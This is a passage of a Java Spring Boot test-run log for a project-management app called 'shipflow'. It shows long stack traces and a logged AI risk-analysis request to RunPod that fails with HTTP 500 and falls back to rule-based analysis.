	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:247) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.401Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.399704","status":500}
2026-01-17T23:26:46.402Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 36 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.423Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 37 (withAI=true)
2026-01-17T23:26:46.424Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 689 chars
2026-01-17T23:26:46.424Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: At Risk Pitch\nDescription: Test description for At Risk Pitch\nAppetite: 10 days\nStatus: IN_PROGRESS\nProgress: 112.5%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.429Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.428686","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.428686","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getCycleHealthSummary(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getCycleHealthWithAI(PitchHealthController.java:57) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
